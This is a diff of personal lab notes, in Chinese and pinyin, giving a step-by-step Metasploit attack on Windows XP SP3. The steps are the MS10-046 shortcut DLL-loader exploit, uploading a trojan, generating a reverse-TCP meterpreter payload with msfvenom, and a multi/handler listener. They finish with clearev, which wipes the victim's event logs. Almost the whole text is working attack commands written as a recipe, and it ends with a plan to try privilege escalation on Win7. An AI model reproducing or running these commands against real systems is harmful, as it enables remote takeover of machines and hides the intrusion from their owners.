@@ -1,30 +1,33 @@
-Windows XP Professional with Service Pack 3 (x86) - CD  2008-05-01  zhegebanben ceshi tongguo 
-win7 haimeiceshi 
+Windows XP Professional with Service Pack 3 (x86) - CD  2008-05-01  这个版本测试通过
+win7   还没测试
 
 use exploit/windows/browser/ms10_046_shortcut_icon_dllloader
-set SRVHOST 192.168.55.201   kali  de ip dizhi
+set SRVHOST 192.168.55.201   kali  的 ip 地址
 run
-yunxinghoushengcheng http://192.168.55.201/
+运行后生成 http://192.168.55.201/
 
-zai xp xia dakai zhege lianjie  hui tiaozhuandao \\192.168.55.201\NCqMi\
-yihui  kali xiamian jiu hui tishi chengong 
+在 xp 下打开这个链接  会跳转到 \\192.168.55.201\NCqMi\     有个快捷方式 跟dll
+一会  kali 下面  就会提示成功 
 
 meterpreter > upload /home/kali/openme.exe c:\
-zhetiao mingling keyi shangchuan muma 
-muma de shengchenggongcheng    msfvenom -p windows/meterpreter/reverse_tcp Lhost=192.168.55.201 lport=50000 -f exe -o openme.exe
-chmod 777 openme.exe keneng shiduoyude 
+这条命令可以上传木马 
+木马的生成过程    msfvenom -p windows/meterpreter/reverse_tcp Lhost=192.168.55.201 lport=50000 -f exe -o openme.exe
+chmod 777 openme.exe 可能是多余的 
 
-tuichudangqian meterpreter
+退出当前  meterpreter
 
-keyiyong muma lianjiele
+可以用木马连接了
 
 
-kakaijianting
+打开监听
 use exploit/multi/handler 
 set payload windows/meterpreter/reverse_tcp     xpshi x86de32weide
 set lhost 192.168.55.201                 kali ipdizhi
 set lport 50000                          
 run
 
-zhihou xp yunxing openme.exe  jiukeyi zidonglianshang 
-meterpreter > clearev    qingchurizhi
+之后 xp 运行 openme.exe  就可以自动连上 
+meterpreter > clearev    清除日志
+
+
+有机会试试win7 64位  貌似要提权
